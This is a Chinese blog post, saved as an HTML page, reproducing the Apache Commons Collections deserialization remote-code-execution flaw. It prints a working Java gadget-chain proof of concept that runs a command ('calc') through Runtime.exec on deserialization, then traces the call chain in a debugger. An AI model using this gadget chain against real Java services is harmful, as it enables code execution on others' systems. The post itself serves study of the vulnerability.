@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言Apache-CommonsCollections序列化RCE漏洞主要问题在org.apache.commons.collections.Transformer接口上。利用三个实现接口的类构造出payload，配合sun.reflect.annotation.AnnotationInvocationHandler 中重写的 readObject()，可以触发payload执行。网络上的poc如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache-CommonsCollections反序列化漏洞复现">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;03&#x2F;24&#x2F;Apache-CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="前言Apache-CommonsCollections序列化RCE漏洞主要问题在org.apache.commons.collections.Transformer接口上。利用三个实现接口的类构造出payload，配合sun.reflect.annotation.AnnotationInvocationHandler 中重写的 readObject()，可以触发payload执行。网络上的poc如">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;DJA6nXywFU9vpHI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;oQhiH9WLpk4gyNb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;tNK24DZAzbIdmuG.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;uYcTH4ex2aMhsCp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;zXK4vnLNsHxtEge.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;HCKqgR6DrBmaVL7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;WKyukFXPfgB2VGh.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;4LpcCTQ3R9YWFMn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;oXumtkMv4EaTOrq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;eMFPjY6vBdSAWxH.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;JGTQmYypsiUoPRE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;IKuAUFMVemhEkqp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;U6yVQI21R3KM7um.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;qkdz6tUOlRWIK24.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;HjyR7tc6LUznBCQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;BGmAx6Lthqnvy8z.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;OaQJBV6dTzAmkbG.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;vOb782tDseMXznI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;5tQXlHem6CZ8iRA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;3PyrwZLbnOeEYoT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;jbY9GD6SFQvuegf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;8xLrSsIlEWaNdqo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;txUTJjGMlrQmoBN.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;gyzNCmd5O91Us3Q.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;25&#x2F;XpRQvMTYfk5d8jP.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;25&#x2F;w8NzRPrsW9mdOck.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;25&#x2F;HuQfSki8laxCr6y.png">
+<meta property="og:updated_time" content="2021-03-24T17:39:46.004Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;24&#x2F;DJA6nXywFU9vpHI.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/03/24/Apache-CommonsCollections反序列化漏洞复现/"/>
+
+
+
+
+
+  <title>Apache-CommonsCollections反序列化漏洞复现 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/24/Apache-CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache-CommonsCollections反序列化漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-24T12:11:26+08:00">
+                2021-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache-CommonsCollections序列化RCE漏洞主要问题在org.apache.commons.collections.Transformer接口上。<br>利用三个实现接口的类构造出payload，<br>配合sun.reflect.annotation.AnnotationInvocationHandler 中重写的 readObject()，可以触发payload执行。<br>网络上的poc如下,用到的第三方包需要自行下载导入。<br>复现环境 windows10家庭版 jdk1.7</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; "calc" &#125;) &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射获得AnnotationInvocationHandler类对象</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="comment">//通过反射获得cls的构造函数</span></span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//这里需要设置Accessible为true，否则序列化失败</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//通过newInstance()方法实例化对象</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outmap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),<span class="string">"obj"</span>);</span><br><span class="line">        payloadTest(<span class="string">"obj"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//将构造好的payload序列化后写入文件中</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//读取写入的payload，并进行反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于是在windows下复现的漏洞，最后exec函数执行的命令我修改为calc了。</p>
+<h1 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h1><p>分析poc的代码也不难看出，Reverse_Payload函数利用反射获取了AnnotationInvocationHandler类的构造函数，随后用构造的outmap实例化了一个AnnotationInvocationHandler类对象并将之返回。<br>而GeneratePayload函数就是将Reverse_Payload函数返回的AnnotationInvocationHandler实例序列化后写入到文件中。<br>随后payloadTest函数将保存在文件中的字节流读取进行反序列化，在反序列化过程中触发恶意代码的执行。<br>上述poc并没有模拟服务端，而是直接在本地模拟了一次序列化与反序列化的过程，不过不影响我们学习其中的原理。</p>
+<h2 id="Reverse-Payload函数分析"><a href="#Reverse-Payload函数分析" class="headerlink" title="Reverse_Payload函数分析"></a>Reverse_Payload函数分析</h2><p>函数一开始构造了一个Transformer数组，Transformer这个接口定义如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在函数中，使用了三个实现Transformer接口的类，分别是ConstantTransformer，InvokerTransformer和ChainedTransformer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; "calc" &#125;) &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p><strong>说一下，这里其实就是构造的payload了，具体怎么执行的到后边动态调试部分我会说，这里先看一下各个类的实现是怎么样的。</strong></p>
+<hr>
+<p><strong>这里补充一点java基础小知识</strong><br>接口不是类，所以不能用new运算符实例化一个接口，也就是说不能像这样<br><code>x = new Transformer(...)</code><br>不过，虽然不能构造接口的实例，但是可以声明接口的变量，也就是这样<br><code>Transformer x; //ok</code><br>不过接口变量必须引用实现了这个接口的类对象，像这样<br><code>x = new ConstantTransformer(Runtime.class);//ok</code><br>因为ConstantTransformer实现了Transformer接口，所以没问题。上面的Transformer数组同理。</p>
+<hr>
+<p>对用到的三个实现Transformer接口的类逐个分析。<br>先看ConstantTransformer类<br><img src="https://i.loli.net/2021/03/24/DJA6nXywFU9vpHI.png" alt="1.png"><br>构造函数和transform函数都非常简单。构造函数就是将传递的参数绑定到iConstant上，而transform函数就是将iConstant返回。</p>
+<p>再看InvokerTransformer类，先看构造函数<br><img src="https://i.loli.net/2021/03/24/oQhiH9WLpk4gyNb.png" alt="1.png"><br>再看transform函数<br><img src="https://i.loli.net/2021/03/24/tNK24DZAzbIdmuG.png" alt="1.png"><br>其中用到的三个参数iMethodName，iParamTypes和iArgs是构造函数中传递过去的，同样可控。</p>
+<p>最后看ChainedTransformer类<br><img src="https://i.loli.net/2021/03/24/uYcTH4ex2aMhsCp.png" alt="1.png"><br>构造函数接受一个Transformer的数组。<br>transform函数对构造函数中传入的Transformer数组的每个对象都调用一次tranform方法。<br>这里注意object这个参数，每一轮循环都将object作为参数传入tranform方法，并且用方法的返回值更新object。<br>Reverse_Payload函数前半部分的代码构造了一个Transformer数组，然后用Transformer数组初始化了一个ChainedTransformer类的实例</p>
+<p>接着逐行分析函数中剩下的代码<br><img src="https://i.loli.net/2021/03/24/zXK4vnLNsHxtEge.png" alt="1.png"><br>HashMap实现了Map接口，首先实例化了一个HashMap对象赋值给innermap。<br>关于put方法的描述如下<br><img src="https://i.loli.net/2021/03/24/HCKqgR6DrBmaVL7.png" alt="1.png"><br>在这里就是在key和value之间建立映射关系<br>再看<code>Map outmap = TransformedMap.decorate(innermap, null, transformerChain);</code><br>跟进decorate方法<br><img src="https://i.loli.net/2021/03/24/WKyukFXPfgB2VGh.png" alt="1.png"><br>在decorate方法中调用TransformedMap的构造函数实例化了一个对象并将之返回<br>随后通过反射获取AnnotationInvocationHandler类的Class实例<br>再通过Class对象获取到Constructor对象<br>最后调用Constructor类的newInstance方法获取到AnnotationInvocationHandler类的实例并返回。<br>AnnotationInvocationHandler类的构造函数如下<br><img src="https://i.loli.net/2021/03/24/4LpcCTQ3R9YWFMn.png" alt="1.png"></p>
+<hr>
+<p>根据经验，反序列化的问题都是由于重写的readObject方法有漏洞可以利用，在项目中全局搜索AnnotationInvocationHandler类<br>定位到其中的readObject函数，打下断点方便后续进行动态调试<br><img src="https://i.loli.net/2021/03/24/oXumtkMv4EaTOrq.png" alt="1.png"><br>为了执行恶意代码，需要想办法触发ChainedTransformer类的transform方法。<br>而ChainedTransformer类的实例作为TransformedMap构造函数的参数，绑定到了valueTransformer字段<br><img src="https://i.loli.net/2021/03/24/eMFPjY6vBdSAWxH.png" alt="1.png"><br><img src="https://i.loli.net/2021/03/24/JGTQmYypsiUoPRE.png" alt="1.png"><br>而且在TransformedMap的checkSetValue方法中触发了transform方法。<br><img src="https://i.loli.net/2021/03/24/IKuAUFMVemhEkqp.png" alt="1.png"><br>那么就有这么一条调用链<br> this.valueTransformer.transform(value) <strong>这里valueTransformer为ChainedTransformer对象</strong><br> 也就是<br> ChainedTransformer.transform(value)<br> 而 ChainedTransformer.transform方法是<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>也就是将我们精心构造的恶意代码通过反射执行了。</p>
+<p><strong>问题变成了怎么触发checkSetValue() 函数</strong>，根据上图对checkSetValue方法的描述，这个函数会在调用setValue时执行。<br>由于构造的TransformedMap实例被赋值给了outmap变量，而outmap又作为参数初始化了AnnotationInvocationHandler类。<br><img src="https://i.loli.net/2021/03/24/U6yVQI21R3KM7um.png" alt="1.png"><br>所以这里就得想办法让AnnotationInvocationHandler类反序列化的时候触发setValue方法，进而触发outmap的checkSetValue方法，最后执行恶意代码<br>而在AnnotationInvocationHandler的readObject方法中又对memberValues进行了遍历，并对每一个值都调用了setValue方法<br><img src="https://i.loli.net/2021/03/24/qkdz6tUOlRWIK24.png" alt="2.png"><br>这里就可以解释为什么poc中有如下的一行代码<br><code>innermap.put(&quot;value&quot;, &quot;value&quot;);</code><br>有了这一行代码，才能成功地在AnnotationInvocationHandler类反序列化的时候顺利执行到setValue方法。<br>到这里就构成了完整的利用链。</p>
+<hr>
+<p>构造一个payload<br>↓<br>使用payload初始化ChainedTransformer类<br>↓<br>将得到的ChainedTransformer对象用来构造一个TransformedMap(触发checkSetValue方法会导致payload执行)，最后返回一个Map对象<br>↓<br>用outmap初始化AnnotationInvocationHandler类<br>↓<br>AnnotationInvocationHandler类反序列化过程中触发setValue<br>↓<br>由setValue触发checkSetValue导致payload执行</p>
+<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>直接定位到AnnotationInvocationHandler类的readObject函数<br><img src="https://i.loli.net/2021/03/24/HjyR7tc6LUznBCQ.png" alt="1.png"><br>单步跳过，直接来到setValue函数<br><img src="https://i.loli.net/2021/03/24/BGmAx6Lthqnvy8z.png" alt="1.png"><br>跟进setValue函数<br><img src="https://i.loli.net/2021/03/24/OaQJBV6dTzAmkbG.png" alt="1.png"><br>可以看到调用了TransformedMap的checkSetValue方法，继续跟<br><img src="https://i.loli.net/2021/03/24/vOb782tDseMXznI.png" alt="1.png"><br>这里的<code>this.valueTransformer</code>是在Reverse_Payload函数中构造的ChainedTransformer对象<br>所以这里也就是调用了ChainedTransformer.transform方法，直接跟进<br><img src="https://i.loli.net/2021/03/24/5tQXlHem6CZ8iRA.png" alt="1.png"><br>此处涉及到前面构造payload的执行，会一步一步跟进分析，力求搞懂每一个细节。<br>这里会逐个展开<code>this.iTransformers</code>数组，并对其中每个对象都调用其所实现的transform方法<br>第一个对象是ConstantTransformer对象的transform方法，那么继续跟进，就会到ConstantTransformer对象的transform方法中<br><img src="https://i.loli.net/2021/03/24/3PyrwZLbnOeEYoT.png" alt="1.png"><br>这里不管输入是什么，都直接将<code>this.iConstant</code>返回，也就是返回<code>java.lang.Runtime</code>的Class实例<br>继续执行，返回到循环中<br><img src="https://i.loli.net/2021/03/24/jbY9GD6SFQvuegf.png" alt="1.png"><br>注意这里的object已经被更新为<code>java.lang.Runtime</code>的Class实例<br>继续循环，接下来会调用InvokerTransformer的transform方法，跟进其中<br><img src="https://i.loli.net/2021/03/24/8xLrSsIlEWaNdqo.png" alt="1.png"></p>
+<p>先调用getClass拿到一个Class实例cls<br>通过cls调用getMethod方法获取iMethodName和iParamTypes指定的Method对象method<br>最后通过method调用invoke方法，获取到代表<code>java.lang.Runtime.getRuntime</code>方法的Method对象并返回<br>这里的<code>method.invoke(input, this.iArgs);</code>其实可以看作是input.getMethod(iArgs),此处的input是一个class实例，method代表的方法正是Class的getMethod方法<br>就像平常调用对象调用方法那样自然的理解就好</p>
+<hr>
+<p>这里用到了Method.invoke方法，补充一点方法的说明<br><img src="https://i.loli.net/2021/03/24/txUTJjGMlrQmoBN.png" alt="1.png"><br>翻译一下就是：<br>用指定的参数在指定的对象上调用该Method对象所代表的底层方法。单个参数自动解包为与基元形式参数相匹配，基元参数和引用参数都要根据需要进行方法调用转换。</p>
+<p>如果底层方法是静态的，那么指定的obj参数将被忽略。它可以是null。</p>
+<p>如果底层方法所需的形式参数数为0，则提供的args数组长度可以是0，也可以是null。</p>
+<p>如果底层方法是实例方法，则使用《Java语言规范》第15.12.4.4节中记载的动态方法查找来调用它；特别是，可能会发生基于目标对象的运行时类型的覆盖。</p>
+<p>如果底层方法是静态的，那么声明该方法的类如果还没有被初始化，就会被初始化。</p>
